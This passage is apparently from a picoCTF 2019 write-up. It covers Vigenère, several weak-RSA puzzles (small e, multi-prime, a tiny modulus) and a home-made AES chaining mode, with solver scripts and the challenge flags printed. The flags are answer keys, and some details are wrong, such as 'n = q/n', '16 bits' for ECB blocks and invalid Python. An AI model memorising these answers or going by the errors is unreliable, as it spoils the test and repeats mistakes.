Ehk ktryy herq-ooizxetypd jjdcxnatoty ol f aordllvmlbkytc inahkw socjgex, bls sfoe gwzuti 1467 my Rjzn Hfetoxea Gqmexyt.

Tnj Gimjyèrk Htpnjc iy ysexjqoxj dosjeisjd cgqwej yse Gqmexyt Doxn ox Fwbkwei Inahkw.

Tn 1508, Ptsatsps Zwttnjxiax tnbjytki ehk xz-cgqwej ylbaql rkhea (g rltxni ol xsilypd gqahggpty) ysaz bzuri wazjc bk f nroytcgq nosuznkse ol yse Bnretèwp Cousex.

Gplrfdo’y xpcuso butvlky lpvjlrki tn 1555 gx l cuseitzltoty ol yse lncsz. Yse rthex mllbjd ol yse gqahggpty fce tth snnqtki cemzwaxqj, bay ehk fwpnfmezx lnj yse osoed qptzjcs gwp mocpd hd xegsd ol f xnkrznoh vee usrgxp, wnnnh ify bk itfljcety hizm paim noxwpsvtydkse.
</code></pre><p>Well could be a subsitution cipher or any other, lets try our tools:<p><a href=https://www.guballa.de/vigenere-solver>https://www.guballa.de/vigenere-solver</a><pre><code>﻿It is interesting how in history people often receive credit for things they did not create

During the course of history, the Vigenère Cipher has been reinvented many times

It was falsely attributed to Blaise de Vigenère as it was originally described in 1553 by Giovan Battista Bellaso in his book La cifra del. Sig. Giovan Battista Bellaso

For the implementation of this cipher a table is formed by sliding the lower half of an ordinary alphabet for an apparently random number of places with respect to the upper halfpicoCTF{b311a50_0r_v1gn3r3_c1ph3ra653edec}

The first well-documented description of a polyalphabetic cipher however, was made around 1467 by Leon Battista Alberti.

The Vigenère Cipher is therefore sometimes called the Alberti Disc or Alberti Cipher.

In 1508, Johannes Trithemius invented the so-called tabula recta (a matrix of shifted alphabets) that would later be a critical component of the Vigenère Cipher.

Bellaso’s second booklet appeared in 1555 as a continuation of the first. The lower halves of the alphabets are now shifted regularly, but the alphabets and the index letters are mixed by means of a mnemonic key phrase, which can be different with each correspondent.
</code></pre><p>It worked... we see: <code>picoCTF{b311a50_0r_v1gn3r3_c1ph3ra653edec}</code><h3><a class=header href=#flag-17 id=flag-17>Flag</a></h3><p><code>picoCTF{b311a50_0r_v1gn3r3_c1ph3ra653edec}</code><h1><a class=header href=#picoctf19-rsa-pop-quiz id=picoctf19-rsa-pop-quiz>PicoCTF19 RSA Pop Quiz</a></h1><h2><a class=header href=#challenge-18 id=challenge-18>Challenge</a></h2><p>Class, take your seats! It's PRIME-time for a quiz... <code>nc 2019shell1.picoctf.com 2611</code><h3><a class=header href=#hints-16 id=hints-16>Hints</a></h3><p><a href=https://simple.wikipedia.org/wiki/RSA_algorithm>RSA info</a><h2><a class=header href=#solution-18 id=solution-18>Solution</a></h2><pre><code>$ nc 2019shell1.picoctf.com 2611
Good morning class! It's me Ms. Adleman-Shamir-Rivest
Today we will be taking a pop quiz, so I hope you studied. Cramming just will not do!
You will need to tell me if each example is possible, given your extensive crypto knowledge.
Inputs and outputs are in decimal. No hex here!
#### NEW PROBLEM ####
q : 60413
p : 76753
##### PRODUCE THE FOLLOWING ####
n
</code></pre><p>We know <code>n=p*q</code><pre><code>#### TIME TO SHOW ME WHAT YOU GOT! ###
n: 4636878989
Outstanding move!!!


#### NEW PROBLEM ####
p : 54269
n : 5051846941
##### PRODUCE THE FOLLOWING ####
q
</code></pre><p>We know <code>n = q/n</code><pre><code>#### TIME TO SHOW ME WHAT YOU GOT! ###
q: 93089
Outstanding move!!!


#### NEW PROBLEM ####
e : 3
n : 12738162802910546503821920886905393316386362759567480839428456525224226445173031635306683726182522494910808518920409019414034814409330094245825749680913204566832337704700165993198897029795786969124232138869784626202501366135975223827287812326250577148625360887698930625504334325804587329905617936581116392784684334664204309771430814449606147221349888320403451637882447709796221706470239625292297988766493746209684880843111138170600039888112404411310974758532603998608057008811836384597579147244737606088756299939654265086899096359070667266167754944587948695842171915048619846282873769413489072243477764350071787327913
##### PRODUCE THE FOLLOWING ####
q
p
</code></pre><p>We know <code>toitent(n)=(p-1)(q-1)</code> but we don't have the toitent.<pre><code>IS THIS POSSIBLE and FEASIBLE? (Y/N):N
Outstanding move!!!


#### NEW PROBLEM ####
q : 66347
p : 12611
##### PRODUCE THE FOLLOWING ####
totient(n)
</code></pre><p>We know: <code>toitent(n)=(p-1)(q-1)</code><pre><code>IS THIS POSSIBLE and FEASIBLE? (Y/N):Y
#### TIME TO SHOW ME WHAT YOU GOT! ###
totient(n): ^V836623060
Outstanding move!!!


#### NEW PROBLEM ####
plaintext : 6357294171489311547190987615544575133581967886499484091352661406414044440475205342882841236357665973431462491355089413710392273380203038793241564304774271529108729717
e : 3
n : 29129463609326322559521123136222078780585451208149138547799121083622333250646678767769126248182207478527881025116332742616201890576280859777513414460842754045651093593251726785499360828237897586278068419875517543013545369871704159718105354690802726645710699029936754265654381929650494383622583174075805797766685192325859982797796060391271817578087472948205626257717479858369754502615173773514087437504532994142632207906501079835037052797306690891600559321673928943158514646572885986881016569647357891598545880304236145548059520898133142087545369179876065657214225826997676844000054327141666320553082128424707948750331
##### PRODUCE THE FOLLOWING ####
ciphertext
</code></pre><p>We know: <code>c = plaintext^e mod n</code><pre><code>

#### NEW PROBLEM ####
ciphertext : 107524013451079348539944510756143604203925717262185033799328445011792760545528944993719783392542163428637172323512252624567111110666168664743115203791510985709942366609626436995887781674651272233566303814979677507101168587739375699009734588985482369702634499544891509228440194615376339573685285125730286623323
e : 3
n : 27566996291508213932419371385141522859343226560050921196294761870500846140132385080994630946107675330189606021165260590147068785820203600882092467797813519434652632126061353583124063944373336654246386074125394368479677295167494332556053947231141336142392086767742035970752738056297057898704112912616565299451359791548536846025854378347423520104947907334451056339439706623069503088916316369813499705073573777577169392401411708920615574908593784282546154486446779246790294398198854547069593987224578333683144886242572837465834139561122101527973799583927411936200068176539747586449939559180772690007261562703222558103359
##### PRODUCE THE FOLLOWING ####
plaintext
</code></pre><p>We don't know <code>p</code> and <code>q</code><pre><code>IS THIS POSSIBLE and FEASIBLE? (Y/N):N
Outstanding move!!!


#### NEW PROBLEM ####
q : 92092076805892533739724722602668675840671093008520241548191914215399824020372076186460768206814914423802230398410980218741906960527104568970225804374404612617736579286959865287226538692911376507934256844456333236362669879347073756238894784951597211105734179388300051579994253565459304743059533646753003894559
p : 97846775312392801037224396977012615848433199640105786119757047098757998273009741128821931277074555731813289423891389911801250326299324018557072727051765547115514791337578758859803890173153277252326496062476389498019821358465433398338364421624871010292162533041884897182597065662521825095949253625730631876637
e : 65537
##### PRODUCE THE FOLLOWING ####
d
</code></pre><p>We know: <code>d=e^-1 mod ((p-1)(q-1))</code><pre><code class=language-python>from Crypto.Util.number import *

q = ''
p = ''
e = ''
print(inverse(e,((p-1)(q-1))))
</code></pre><p>Easy.<pre><code>IS THIS POSSIBLE and FEASIBLE? (Y/N):Y
#### TIME TO SHOW ME WHAT YOU GOT! ###
d: 1405046269503207469140791548403639533127416416214210694972085079171787580463776820425965898174272870486015739516125786182821637006600742140682552321645503743280670839819078749092730110549881891271317396450158021688253989767145578723458252769465545504142139663476747479225923933192421405464414574786272963741656223941750084051228611576708609346787101088759062724389874160693008783334605903142528824559223515203978707969795087506678894006628296743079886244349469131831225757926844843554897638786146036869572653204735650843186722732736888918789379054050122205253165705085538743651258400390580971043144644984654914856729
Outstanding move!!!


#### NEW PROBLEM ####
p : 153143042272527868798412612417204434156935146874282990942386694020462861918068684561281763577034706600608387699148071015194725533394126069826857182428660427818277378724977554365910231524827258160904493774748749088477328204812171935987088715261127321911849092207070653272176072509933245978935455542420691737433
ciphertext : 4699954403535877728943212516495239996093493409461427795061606820019520385578403561120385764629211115765041521697969103538878070126128059106090044437598460283768854171495071441758538307495380993096127617485853022154997313813963653770523746165616397996160676397490439829116013032980784837094738356175991364395455204835324455810814055944764109234129010492269581408600009386595427991513236458464354768157315483091898970879300954540175247825718514107084608264564889098214264863604883438961600216645976532706988513244819161793096143681897379315082134265617697635800727770233591268184387676917842275673893483582432877323662
e : 65537
n : 23952937352643527451379227516428377705004894508566304313177880191662177061878993798938496818120987817049538365206671401938265663712351239785237507341311858383628932183083145614696585411921662992078376103990806989257289472590902167457302888198293135333083734504191910953238278860923153746261500759411620299864395158783509535039259714359526738924736952759753503357614939203434092075676169179112452620687731670534906069845965633455748606649062394293289967059348143206600765820021392608270528856238306849191113241355842396325210132358046616312901337987464473799040762271876389031455051640937681745409057246190498795697239
##### PRODUCE THE FOLLOWING ####
plaintext
</code></pre><p>We know: <code>d=e^-1 mod toitent(n)</code><p>We need to find <code>q</code>. Then calculate <code>toitent(n)</code> to find <code>d</code>.<p>We know <code>m = ciphertext^d mod n</code> so we have <code>pow(ciphertext,d,n)</code><pre><code>IS THIS POSSIBLE and FEASIBLE? (Y/N):y
#### TIME TO SHOW ME WHAT YOU GOT! ###
plaintext: 14311663942709674867122208214901970650496788151239520971623411712977119645236321549653782653
Outstanding move!!!


If you convert the last plaintext to a hex number, then ascii, you'll find what you need! ;)
</code></pre><p>Plaintext is in decimal.<h3><a class=header href=#flag-18 id=flag-18>Flag</a></h3><p><code>picoCTF{wA8_th4t$_ill3aGal..o1c355060}</code><h3><a class=header href=#solver id=solver>Solver</a></h3><pre><code class=language-python>import binascii
from pwn import *

# Not my initial code, my function wasn't this clean
MMI = lambda A, n,s=1,t=0,N=0: (n &lt; 2 and t%N or MMI(n, A%n, t, s-A//n*t, N or n),-1)[n&lt;1]

r = remote('2019shell1.picoctf.com', 2611)

# Q1
lines = r.recvuntil('IS THIS POSSIBLE and FEASIBLE? (Y/N):')
print lines
q = int([l for l in lines.split('\n') if 'q :' in l][0].split(':')[1].strip(), 10)
p = int([l for l in lines.split('\n') if 'p :' in l][0].split(':')[1].strip(), 10)
r.sendline('Y')
print r.recvuntil('n:')
ans = q * p
print 'Sending: {}'.format(ans)
r.sendline('{}'.format(ans))

# Q2
lines = r.recvuntil('IS THIS POSSIBLE and FEASIBLE? (Y/N):')
print lines
p = int([l for l in lines.split('\n') if 'p :' in l][0].split(':')[1].strip(), 10)
n = int([l for l in lines.split('\n') if 'n :' in l][0].split(':')[1].strip(), 10)
r.sendline('Y')
print r.recvuntil('q:')
ans = n / p
print 'Sending: {}'.format(ans)
r.sendline('{}'.format(ans))

# Q3
lines = r.recvuntil('IS THIS POSSIBLE and FEASIBLE? (Y/N):')
print lines
r.sendline('N')

# Q4
lines = r.recvuntil('IS THIS POSSIBLE and FEASIBLE? (Y/N):')
print lines
q = int([l for l in lines.split('\n') if 'q :' in l][0].split(':')[1].strip(), 10)
p = int([l for l in lines.split('\n') if 'p :' in l][0].split(':')[1].strip(), 10)
r.sendline('Y')
print r.recvuntil('totient(n):')
ans = (q - 1) * (p - 1)
print 'Sending: {}'.format(ans)
r.sendline('{}'.format(ans))

# Q5
lines = r.recvuntil('IS THIS POSSIBLE and FEASIBLE? (Y/N):')
print lines
plain = int([l for l in lines.split('\n') if 'plaintext :' in l][0].split(':')[1].strip(), 10)
e = int([l for l in lines.split('\n') if 'e :' in l][0].split(':')[1].strip(), 10)
n = int([l for l in lines.split('\n') if 'n :' in l][0].split(':')[1].strip(), 10)
r.sendline('Y')
print r.recvuntil('ciphertext:')
ans = pow(plain, e, n)
print 'Sending: {}'.format(ans)
r.sendline('{}'.format(ans))

# Q6
lines = r.recvuntil('IS THIS POSSIBLE and FEASIBLE? (Y/N):')
print lines
r.sendline('N')

# Q7
lines = r.recvuntil('IS THIS POSSIBLE and FEASIBLE? (Y/N):')
print lines
q = int([l for l in lines.split('\n') if 'q :' in l][0].split(':')[1].strip(), 10)
p = int([l for l in lines.split('\n') if 'p :' in l][0].split(':')[1].strip(), 10)
e = int([l for l in lines.split('\n') if 'e :' in l][0].split(':')[1].strip(), 10)
r.sendline('Y')
print r.recvuntil('d:')
ans = MMI(e, (q - 1) * (p - 1))
print 'Sending: {}'.format(ans)
r.sendline('{}'.format(ans))

# Q8
lines = r.recvuntil('IS THIS POSSIBLE and FEASIBLE? (Y/N):')
print lines
p = int([l for l in lines.split('\n') if 'p :' in l][0].split(':')[1].strip(), 10)
cipher = int([l for l in lines.split('\n') if 'ciphertext :' in l][0].split(':')[1].strip(), 10)
e = int([l for l in lines.split('\n') if 'e :' in l][0].split(':')[1].strip(), 10)
n = int([l for l in lines.split('\n') if 'n :' in l][0].split(':')[1].strip(), 10)
r.sendline('Y')
print r.recvuntil('plaintext:')
q = n / p
d = MMI(e, (q - 1) * (p - 1))
ans = pow(cipher, d, n)
print 'Sending: {}'.format(ans)
r.sendline('{}'.format(ans))
lines = r.recvall()
print lines
print 'In hex: {}'.format(hex(ans))
print binascii.unhexlify(hex(ans)[2:])
</code></pre><h1><a class=header href=#picoctf19-minirsa id=picoctf19-minirsa>PicoCTF19 miniRSA</a></h1><h2><a class=header href=#challenge-19 id=challenge-19>Challenge</a></h2><p>Lets decrypt this: <a href=https://2019shell1.picoctf.com/static/5829e4221ce46d77254176b3e04f9e46/ciphertext>ciphertext</a>? Something seems a bit small<pre><code>N: 29331922499794985782735976045591164936683059380558950386560160105740343201513369939006307531165922708949619162698623675349030430859547825708994708321803705309459438099340427770580064400911431856656901982789948285309956111848686906152664473350940486507451771223435835260168971210087470894448460745593956840586530527915802541450092946574694809584880896601317519794442862977471129319781313161842056501715040555964011899589002863730868679527184420789010551475067862907739054966183120621407246398518098981106431219207697870293412176440482900183550467375190239898455201170831410460483829448603477361305838743852756938687673
e: 3

ciphertext (c):  
2205316413931134031074603746928247799030155221252519872649594750678791181631768977116979076832403970846785672184300449694813635798586699205901153799059293422365185314044451205091048294412538673475392478762390753946407342073522966852394341
</code></pre><h2><a class=header href=#hints-17 id=hints-17>Hints</a></h2><p>RSA <a href=https://en.wikipedia.org/wiki/RSA_(cryptosystem)>tutorial</a><p>How could having too small an e affect the security of this 2048 bit key?<p>Make sure you dont lose precision, the numbers are pretty big (besides the e value)<h2><a class=header href=#solution-19 id=solution-19>Solution</a></h2><p>We know <code>c = m^e % n</code> where <code>m</code> is the plaintext. E is small, so we could conceivably compute the cube root.<p><a href=https://github.com/Ganapati/RsaCtfTool>RSACTFTool</a><p><code>$ python RsaCtfTool.py -e 3 -n TODO --uncipher TODO</code><pre><code class=language-python>c = 2205316413931134031074603746928247799030155221252519872649594750678791181631768977116979076832403970846785672184300449694813635798586699205901153799059293422365185314044451205091048294412538673475392478762390753946407342073522966852394341
def find_cubic_root(n):
    a = 1
    b = n
    while b - a &gt; 1:
        mid = (a + b) // 2
        if mid**3 &gt; n:
            b = mid
        else:
            a = mid

    if a ** 3 == n:
        return a
    elif b ** 3 == n:
        return b
    else:
        return 0

m = find_cubic_root(c)
h = hex(m)
print(h)
p = str(hex(m)[2:]).decode('hex')
print(p)
</code></pre><h2><a class=header href=#flag-19 id=flag-19>Flag</a></h2><p><code>picoCTF{n33d_a_lArg3r_e_0a41ef50}</code><h1><a class=header href=#picoctf19-b00tl3grsa2 id=picoctf19-b00tl3grsa2>PicoCTF19 b00tl3gRSA2</a></h1><h2><a class=header href=#challenge-20 id=challenge-20>Challenge</a></h2><p>In RSA d is alot bigger than e, why dont we use d to encrypt instead of e? Connect with <code>nc 2019shell1.picoctf.com 40480</code><h2><a class=header href=#hints-18 id=hints-18>Hints</a></h2><p>What is e generally?<h2><a class=header href=#solution-20 id=solution-20>Solution</a></h2><pre><code class=language-bash>$ nc 2019shell1.picoctf.com 40480
c: 2227211376737039937815591841583322219566252533744426276462773206888045748184290863025760295434296972640543617203018637540296885139307674289872088998737701404390693351315297815971174195313821697937235534517169830898020526018142713263804256799943353034620585446162361316614966452481137685467482096376041045553
n: 122257867992330123694849053069496256961142485055188967457363024625095520165285145992678350145142588928812101783584788345493756672241488097846310440568192896037282979149068599758350070038965853680896117225473022760423760319172301276128334331212378438916320597811225476816307146390872876401243235221507551945427
e: 9040109072597643764976097642168223465121938486312247071095430326887298636205072210820136484785098279582883641961821327223747575166428907672966727115880535670506948628864730176719767934575396842177316167915271868800274457299592123662593058375645834359674722354498324615375871394016309861546258126561404675201
</code></pre><p>We seem to be given another message which we need to decipher. <code>e</code> is actually quite large this time.<p>Let's try: <a href=https://github.com/Ganapati/RsaCtfTool>RSACTFTool</a><pre><code class=language-bash>$ python RsaCtfTool.py -n 122257867992330123694849053069496256961142485055188967457363024625095520165285145992678350145142588928812101783584788345493756672241488097846310440568192896037282979149068599758350070038965853680896117225473022760423760319172301276128334331212378438916320597811225476816307146390872876401243235221507551945427 -e 9040109072597643764976097642168223465121938486312247071095430326887298636205072210820136484785098279582883641961821327223747575166428907672966727115880535670506948628864730176719767934575396842177316167915271868800274457299592123662593058375645834359674722354498324615375871394016309861546258126561404675201 --uncipher 2227211376737039937815591841583322219566252533744426276462773206888045748184290863025760295434296972640543617203018637540296885139307674289872088998737701404390693351315297815971174195313821697937235534517169830898020526018142713263804256799943353034620585446162361316614966452481137685467482096376041045553
[+] Clear text :                                                                                                       picoCTF{bad_1d3a5_9093280}
</code></pre><h2><a class=header href=#flag-20 id=flag-20>Flag</a></h2><p><code>picoCTF{bad_1d3a5_9093280}</code><h1><a class=header href=#picoctf19-b00tl3grsa3 id=picoctf19-b00tl3grsa3>PicoCTF19 b00tl3gRSA3</a></h1><h2><a class=header href=#challenge-21 id=challenge-21>Challenge</a></h2><p>Why use p and q when I can use more? Connect with <code>nc 2019shell1.picoctf.com 47259</code>.<h2><a class=header href=#hints-19 id=hints-19>Hints</a></h2><p>There's more prime factors than p and q, finding d is going to be different.<h2><a class=header href=#solution-21 id=solution-21>Solution</a></h2><pre><code class=language-bash>c: 115907801461313158965377829999414983694947203616237913344000889317863736758531019893044675670470719016550935245498480076257808295666213250671705647052952985160750026716806648346149941402624934593771389255609760111103294960111447016315854679477953928170272549763616429741944532210423007533197499524142851496972167029509575747311697967407757038
n: 505186941595372767417204483069962456956876881699737700099184038281005218489284390560248445518556484612403558042307234530875326885844802849178814990909325938778660794800605676053790848757817436721133841429031968710360577866052273624130574100503249945336634715178677448719258396584686548296179014568446031310597909656036281488083645611195095047
e: 65537
</code></pre><p>Let's try <a href=https://github.com/Ganapati/RsaCtfTool>RSACTFTool</a>.<pre><code class=language-bash>$ python RsaCtfTool.py -n 505186941595372767417204483069962456956876881699737700099184038281005218489284390560248445518556484612403558042307234530875326885844802849178814990909325938778660794800605676053790848757817436721133841429031968710360577866052273624130574100503249945336634715178677448719258396584686548296179014568446031310597909656036281488083645611195095047 -e 65537 --uncipher 115907801461313158965377829999414983694947203616237913344000889317863736758531019893044675670470719016550935245498480076257808295666213250671705647052952985160750026716806648346149941402624934593771389255609760111103294960111447016315854679477953928170272549763616429741944532210423007533197499524142851496972167029509575747311697967407757038
[+] Clear text : ,qDhpُQ&gt;ML)e
</code></pre><p>I guess this tool doesn't support multi-prime RSA. So lets try to find some factors.<p><a href=https://www.alpertron.com.ar/ECM.HTM>Integer factorization calculator</a><p>This website also gives us the <code>totient(n)</code><p><code>phi = 505186940041440309962987635962658666379959200685840459741094888209162455093388423841205618560994296346081983144064357582395160227000498559919431103749690592351484252144388376192135608477301020357011256865836603207375248074893376070863434356494230539317810776913265268813717240782848195688483960936781393194407125679299624960000000000000000000</code><p>Let's just calculate this manually:<pre><code class=language-python>from pwn import *
from __future__ import print

def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    else:
        g, y, x = egcd(b % a, a)
        return (g, x - (b // a) * y, y)

def modinv(a, m):
    g, x, y = egcd(a, m)
    if g != 1:
        raise Exception('modular inverse does not exist')
    else:
        return x % m

c = 115907801461313158965377829999414983694947203616237913344000889317863736758531019893044675670470719016550935245498480076257808295666213250671705647052952985160750026716806648346149941402624934593771389255609760111103294960111447016315854679477953928170272549763616429741944532210423007533197499524142851496972167029509575747311697967407757038
n = 505186941595372767417204483069962456956876881699737700099184038281005218489284390560248445518556484612403558042307234530875326885844802849178814990909325938778660794800605676053790848757817436721133841429031968710360577866052273624130574100503249945336634715178677448719258396584686548296179014568446031310597909656036281488083645611195095047
e = 65537
phi=505186940041440309962987635962658666379959200685840459741094888209162455093388423841205618560994296346081983144064357582395160227000498559919431103749690592351484252144388376192135608477301020357011256865836603207375248074893376070863434356494230539317810776913265268813717240782848195688483960936781393194407125679299624960000000000000000000    

d = modinv(e, phi) # c^d = m 
m = pow(c, d, n)
flag = unhex(hex(m)[2:])
print(flag)

</code></pre><h2><a class=header href=#flag-21 id=flag-21>Flag</a></h2><p><code>picoCTF{too_many_fact0rs_3978938}</code><h1><a class=header href=#picoctf19-john_pollard id=picoctf19-john_pollard>PicoCTF19 john_pollard</a></h1><h2><a class=header href=#challenge-22 id=challenge-22>Challenge</a></h2><p>Sometimes RSA <a href=https://2019shell1.picoctf.com/static/ccd7ba84ead965bd2033a54c4dbb8ae0/cert>certificates</a> are breakable<pre><code>-----BEGIN CERTIFICATE-----
MIIB6zCB1AICMDkwDQYJKoZIhvcNAQECBQAwEjEQMA4GA1UEAxMHUGljb0NURjAe
Fw0xOTA3MDgwNzIxMThaFw0xOTA2MjYxNzM0MzhaMGcxEDAOBgNVBAsTB1BpY29D
VEYxEDAOBgNVBAoTB1BpY29DVEYxEDAOBgNVBAcTB1BpY29DVEYxEDAOBgNVBAgT
B1BpY29DVEYxCzAJBgNVBAYTAlVTMRAwDgYDVQQDEwdQaWNvQ1RGMCIwDQYJKoZI
hvcNAQEBBQADEQAwDgIHEaTUUhKxfwIDAQABMA0GCSqGSIb3DQEBAgUAA4IBAQAH
al1hMsGeBb3rd/Oq+7uDguueopOvDC864hrpdGubgtjv/hrIsph7FtxM2B4rkkyA
eIV708y31HIplCLruxFdspqvfGvLsCynkYfsY70i6I/dOA6l4Qq/NdmkPDx7edqO
T/zK4jhnRafebqJucXFH8Ak+G6ASNRWhKfFZJTWj5CoyTMIutLU9lDiTXng3rDU1
BhXg04ei1jvAf0UrtpeOA6jUyeCLaKDFRbrOm35xI79r28yO8ng1UAzTRclvkORt
b8LMxw7e+vdIntBGqf7T25PLn/MycGPPvNXyIsTzvvY/MXXJHnAqpI5DlqwzbRHz
q16/S1WLvzg4PsElmv1f
-----END CERTIFICATE-----
</code></pre><h2><a class=header href=#hints-20 id=hints-20>Hints</a></h2><p>The flag is in the format picoCTF{p,q}<p>Try swapping p and q if it does not work<h2><a class=header href=#solution-22 id=solution-22>Solution</a></h2><p>Let's see what information we can find out about this certificate with this <a href=https://redkestrel.co.uk/products/decoder/>Certificate Decoder</a><pre><code>Check 	Result
Expiry 	FAILED - Expired Jun 26 2019
Debian RSA Weak Key 	Unable to check
Key Size 	WARNING (53 bits)
MD5 	PASSED - Not using the MD5 algorithm
SHA1 	PASSED - Not using the SHA1 algorithm

Certificate:
    Data:
        Version: 1 (0x0)
        Serial Number: 12345 (0x3039)
        Signature Algorithm: md2WithRSAEncryption
        Issuer: CN=PicoCTF
        Validity
            Not Before: Jul  8 07:21:18 2019 GMT
            Not After : Jun 26 17:34:38 2019 GMT
        Subject: OU=PicoCTF, O=PicoCTF, L=PicoCTF, ST=PicoCTF, C=US, CN=PicoCTF
        Subject Public Key Info:
            Public Key Algorithm: rsaEncryption
                RSA Public-Key: (53 bit)
                Modulus: 4966306421059967 (0x11a4d45212b17f)
                Exponent: 65537 (0x10001)
    Signature Algorithm: md2WithRSAEncryption
         07:6a:5d:61:32:c1:9e:05:bd:eb:77:f3:aa:fb:bb:83:82:eb:
         9e:a2:93:af:0c:2f:3a:e2:1a:e9:74:6b:9b:82:d8:ef:fe:1a:
         c8:b2:98:7b:16:dc:4c:d8:1e:2b:92:4c:80:78:85:7b:d3:cc:
         b7:d4:72:29:94:22:eb:bb:11:5d:b2:9a:af:7c:6b:cb:b0:2c:
         a7:91:87:ec:63:bd:22:e8:8f:dd:38:0e:a5:e1:0a:bf:35:d9:
         a4:3c:3c:7b:79:da:8e:4f:fc:ca:e2:38:67:45:a7:de:6e:a2:
         6e:71:71:47:f0:09:3e:1b:a0:12:35:15:a1:29:f1:59:25:35:
         a3:e4:2a:32:4c:c2:2e:b4:b5:3d:94:38:93:5e:78:37:ac:35:
         35:06:15:e0:d3:87:a2:d6:3b:c0:7f:45:2b:b6:97:8e:03:a8:
         d4:c9:e0:8b:68:a0:c5:45:ba:ce:9b:7e:71:23:bf:6b:db:cc:
         8e:f2:78:35:50:0c:d3:45:c9:6f:90:e4:6d:6f:c2:cc:c7:0e:
         de:fa:f7:48:9e:d0:46:a9:fe:d3:db:93:cb:9f:f3:32:70:63:
         cf:bc:d5:f2:22:c4:f3:be:f6:3f:31:75:c9:1e:70:2a:a4:8e:
         43:96:ac:33:6d:11:f3:ab:5e:bf:4b:55:8b:bf:38:38:3e:c1:
         25:9a:fd:5f
</code></pre><p>The key size is 53 bits which is rather weak. The modulus <code>4966306421059967</code> is <em>tiny</em>.<p>Let's find the factors: <a href="http://factordb.com/index.php?query=4966306421059967">FactorDB</a> == 67867967 & 73176001<p>since <code>4966306421059967</code> == <code>n</code><p><code>picoCTF{67867967,73176001}</code> didn't work but <code>picoCTF{73176001,67867967}</code> works.<h2><a class=header href=#flag-22 id=flag-22>Flag</a></h2><p><code>picoCTF{73176001,67867967}</code><h1><a class=header href=#picoctf19-aes-abc id=picoctf19-aes-abc>PicoCTF19 AES-ABC</a></h1><h2><a class=header href=#challenge-23 id=challenge-23>Challenge</a></h2><p>AES-ECB is bad, so I rolled my own cipher block chaining mechanism - Addition Block Chaining! You can find the source here: <a href=https://2019shell1.picoctf.com/static/f8b82da049bf23cb598c4bdac73207e8/aes-abc.py>aes-abc.py</a>. The AES-ABC flag is <a href=https://2019shell1.picoctf.com/static/f8b82da049bf23cb598c4bdac73207e8/body.enc.ppm>body.enc.ppm</a><p>aes-abc.py<pre><code class=language-python>#!/usr/bin/env python

from Crypto.Cipher import AES
from key import KEY
import os
import math

BLOCK_SIZE = 16
UMAX = int(math.pow(256, BLOCK_SIZE))


def to_bytes(n):
    s = hex(n)
    s_n = s[2:]
    if 'L' in s_n:
        s_n = s_n.replace('L', '')
    if len(s_n) % 2 != 0:
        s_n = '0' + s_n
    decoded = s_n.decode('hex')

    pad = (len(decoded) % BLOCK_SIZE)
    if pad != 0: 
        decoded = &quot;\0&quot; * (BLOCK_SIZE - pad) + decoded
    return decoded


def remove_line(s):
    # returns the header line, and the rest of the file
    return s[:s.index('\n') + 1], s[s.index('\n')+1:]


def parse_header_ppm(f):
    data = f.read()

    header = &quot;&quot;

    for i in range(3):
        header_i, data = remove_line(data)
        header += header_i

    return header, data
        

def pad(pt):
    padding = BLOCK_SIZE - len(pt) % BLOCK_SIZE
    return pt + (chr(padding) * padding)


def aes_abc_encrypt(pt):
    cipher = AES.new(KEY, AES.MODE_ECB)
    ct = cipher.encrypt(pad(pt))

    blocks = [ct[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(ct) / BLOCK_SIZE)]
    iv = os.urandom(16)
    blocks.insert(0, iv)
    
    for i in range(len(blocks) - 1):
        prev_blk = int(blocks[i].encode('hex'), 16)
        curr_blk = int(blocks[i+1].encode('hex'), 16)

        n_curr_blk = (prev_blk + curr_blk) % UMAX
        blocks[i+1] = to_bytes(n_curr_blk)

    ct_abc = &quot;&quot;.join(blocks)
 
    return iv, ct_abc, ct


if __name__==&quot;__main__&quot;:
    with open('flag.ppm', 'rb') as f:
        header, data = parse_header_ppm(f)
    
    iv, c_img, ct = aes_abc_encrypt(data)

    with open('body.enc.ppm', 'wb') as fw:
        fw.write(header)
        fw.write(c_img)
</code></pre><h2><a class=header href=#hints-21 id=hints-21>Hints</a></h2><p>You probably want to figure out what the flag looks like in ECB form...<h2><a class=header href=#solution-23 id=solution-23>Solution</a></h2><p>Let's take a look at how it was encrypted:<pre><code class=language-python>def aes_abc_encrypt(pt):
    cipher = AES.new(KEY, AES.MODE_ECB)
    ct = cipher.encrypt(pad(pt))

    blocks = [ct[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(ct) / BLOCK_SIZE)]
    iv = os.urandom(16)
    blocks.insert(0, iv)
    
    for i in range(len(blocks) - 1):
        prev_blk = int(blocks[i].encode('hex'), 16)
        curr_blk = int(blocks[i+1].encode('hex'), 16)

        n_curr_blk = (prev_blk + curr_blk) % UMAX
        blocks[i+1] = to_bytes(n_curr_blk)

    ct_abc = &quot;&quot;.join(blocks)
 
    return iv, ct_abc, ct
</code></pre><p>Uhoh, it's in ECB (Electronic Codebook) mode which encrypts data 16 bits at a time.<p>But instead of XOR-ing the ECB blocks, it seems to be adding them. Weird, did they roll their own crypto algorithm?<p>Let's first convert all the ciphertext blocks back to ecb blocks.<p>Let's create an aes_abc_decrypt(ct):<pre><code class=language-python>def aes_abc_decrypt(c_img):
    blocks = [c_img[i * BLOCK_SIZE:(i+1) * BLOCK_SIZE] for i in range(len(c_img) / BLOCK_SIZE)]

    for i in range(len(blocks) - 2, -1, -1):
        n_curr_blk = from_bytes(blocks[i+1])
        n_prev_blk = from_bytes(blocks[i])

        curr_blk = (n_curr_blk - n_prev_blk) % UMAX

        blocks[i+1] = to_bytes(curr_blk)

    ct = ''.join(blocks[1:])

    return ct
</code></pre><p>Final script is in assets<pre><code>$ file decrypt.ppm
decrypt.ppm: Netpbm image data, size = 1895 x 820, rawbits, pixmap
